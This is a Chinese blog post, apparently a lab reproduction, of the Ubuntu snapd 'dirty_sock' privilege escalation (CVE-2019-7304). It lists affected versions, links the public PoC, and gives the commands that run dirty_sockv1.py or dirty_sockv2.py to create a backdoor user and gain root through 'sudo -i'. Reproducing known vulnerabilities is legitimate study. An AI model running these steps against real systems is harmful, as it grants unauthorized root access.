# Ubuntu 提权漏洞(CVE-2019-7304)复现 - Sch01aR# - 博客园

> 原文：[`www.cnblogs.com/sch01ar/p/10453368.html`](https://www.cnblogs.com/sch01ar/p/10453368.html)

# 漏洞描述：

Ubuntu 版本：

Ubuntu 18.10

Ubuntu 18.04 LTS

Ubuntu 16.04 LTS

Ubuntu 14.04 LTS

![](img/368c6b497dff0b3e2693134ac32cbabf.png)

2.28 < snapd < 2.37 会存在该漏洞

Poc Github：https://github.com/initstring/dirty_sock

# #1

注册并登陆，[`login.ubuntu.com/`](https://login.ubuntu.com/)在 Ubuntu 上，生成密钥

```
ssh-keygen -t rsa -C "your_email@example.com"

```

![](img/61e3d23c4e92b75c426f9c9a77482fe2.png)

查看公钥

![](img/b7288e68957cb626e4211dfc13c53183.png)

将公钥复制到网站上

![](img/aef9f0a725ec182a972a2ea111a55f2b.png)

接下来执行 poc

```
python3 ./dirty_sockv1.py -u "sch01ar@163.com" -k "../.ssh/id_rsa"

```

![](img/5911ffa05eb32cb6ceaa14648e789626.png)

执行完之后 sch01ar 被修改为 Ubuntu 上的用户名

接着切换为 root 用户

```
sudo -i

```

 ![](img/e408c203e225cd3a19b1e4da4e429eda.png)

切换成 root 用户时不需要输入密码

# #2

直接运行脚本

```
python3 dirty_sockv2.py

```

![](img/e6497e2c5ce27ece9cb525c80ae727f6.png)

执行完会生成一个 dirty_sock 的用户，密码也是这个